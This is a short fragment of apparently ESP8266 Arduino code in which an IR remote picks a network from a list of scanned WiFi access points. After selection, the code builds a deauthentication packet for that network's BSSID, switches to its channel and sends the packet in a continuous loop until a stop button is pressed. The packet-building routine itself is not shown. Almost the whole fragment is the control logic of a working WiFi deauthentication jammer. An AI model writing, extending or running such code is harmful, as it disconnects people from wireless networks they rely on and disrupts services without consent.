IRrecv irrecv(14);
decode_results results;
int shift = 0;
int pointer = 0;
int first_item_pos = 0;
int SSID_counter = 0;
int id = 0;
bool isSelected = false;
void controls() {
  if (irrecv.decode(&results)) {
    if (results.value == 16754775) {
      if (pointer > 4 && shift <= SSID_counter - 8) {
        shift++;
      } else {
        if (pointer < 5) {
          pointer++;
        }
      }
    }
    if (results.value == 16736925) {
      if (pointer < 1 && shift > 0) {
        shift--;
      } else {
        if (pointer > 0) {
          pointer--;
        }
      }
    }
    if (results.value == 16753245) {
      id = shift + pointer;
      isSelected = true;
      displayAll();
      createPacket(WiFi.BSSID(id));
      wifi_set_channel(WiFi.channel(id));
      while (isSelected) {
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        irrecv.resume();
        for (int i = 0; i < 200; i++) {
          if (irrecv.decode(&results)) {
            if (results.value == 16769565) {
              isSelected = false;
            }
          }
          delay(1);
        }
      }
    }
    irrecv.resume();
  }
}